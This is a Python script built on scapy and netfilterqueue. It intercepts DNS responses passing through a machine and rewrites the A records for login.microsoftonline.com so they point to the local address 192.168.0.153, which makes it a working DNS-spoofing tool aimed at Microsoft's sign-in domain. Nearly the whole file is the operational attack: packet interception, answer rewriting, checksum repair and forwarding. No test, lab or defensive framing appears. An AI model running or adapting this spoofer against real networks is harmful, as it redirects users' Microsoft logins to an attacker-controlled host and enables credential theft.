from scapy.all import *
import netfilterqueue

DISPLAY_NON_DNS: bool = False

TARGET_DOMAIN = 'login.microsoftonline.com'
SEND_TO = '192.168.0.153'
# SEND_TO_guacamole = '192.168.0.153'

def packet_dump(packet):
    """
    Display detailed information about all layers and fields in a packet.
    Dynamically traverses the packet layers to avoid attribute errors.
    """
    print("=== Packet Dump ===")
    
    # Print the high-level summary of the packet
    print(packet.summary())
    
    # Traverse through all layers
    print("\n--- Layer Details ---")
    current_layer = packet
    while current_layer:
        print(f"[Layer: {type(current_layer).__name__}]")
        # Get all fields and their values for the current layer
        if hasattr(current_layer, "fields"):
            for field_name, field_value in current_layer.fields.items():
                print(f"  {field_name}: {field_value}")
        else:
            print("  No fields available for this layer.")
        current_layer = current_layer.payload
        print("-" * 30)
    
    # Print the raw packet bytes for deeper inspection
    print("\n--- Raw Bytes (Hex) ---")
    print(bytes(packet).hex())
    print("======================\n")

def override_packet(packet):
    """
    Modify only the A records (IP addresses) in the DNS response to point to the spoofed IP.
    """
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):  # Ensure the DNS response layer exists
        # Loop through all answers in the DNS response
        answers = scapy_packet[DNS].an
        modified_answers = []  # Collect modified answers

        if not isinstance(answers, list):  # Single answer case
            answers = [answers]

        for answer in answers:
            if answer.type == 1:  # A record
                rrname = answer.rrname.decode()
                original_ip = answer.rdata
                print(f"  [SPOOFING] Replacing A record {rrname} -> {original_ip} with {SEND_TO}")
                # Replace the IP address in the A record
                modified_answers.append(DNSRR(rrname=rrname, rdata=SEND_TO, ttl=answer.ttl))
            else:
                # Keep non-A records unchanged
                modified_answers.append(answer)

        # Update the DNS response with modified answers
        scapy_packet[DNS].an = modified_answers
        scapy_packet[DNS].ancount = len(modified_answers)

        # Recalculate checksums and lengths
        del scapy_packet[IP].len
        del scapy_packet[IP].chksum
        del scapy_packet[UDP].len
        del scapy_packet[UDP].chksum

        # Set the modified packet as the payload
        packet.set_payload(bytes(scapy_packet))
    else:
        print("  [WARNING] DNS response does not have DNSRR layer. Ignoring packet.")

    return packet



def process_packet(packet):
    """Process packets and print them without modification."""
    scapy_packet = IP(packet.get_payload())  # Convert raw packet to Scapy packet

    if scapy_packet.haslayer(DNS):  # Check for DNS layer
        if scapy_packet[DNS].qr == 0:  # DNS Request
            print(f"[DNS-PACKET] (type=REQUEST)  {scapy_packet.summary()}")  # Print the packet summary
        elif scapy_packet[DNS].qr == 1:  # DNS Response
            print(f"[DNS-PACKET] (type=RESPONSE)  {scapy_packet.summary()}")  # Print the packet summary
            if scapy_packet.haslayer(DNSRR) and TARGET_DOMAIN in scapy_packet[DNSRR].rrname.decode():
                packet = override_packet(packet)
    elif DISPLAY_NON_DNS:
        print(f"[NON-DNS PACKET] {scapy_packet.summary()}")
    
    # Forward the packet
    packet.accept()

def main():
    """Main function to inspect and forward packets."""
    print("[*] Starting packet inspection...")
    queue = netfilterqueue.NetfilterQueue()

    try:
        # Bind the queue to the process_packet function
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\n[!] Stopping script.")
    finally:
        queue.unbind()

if __name__ == "__main__":
    main()
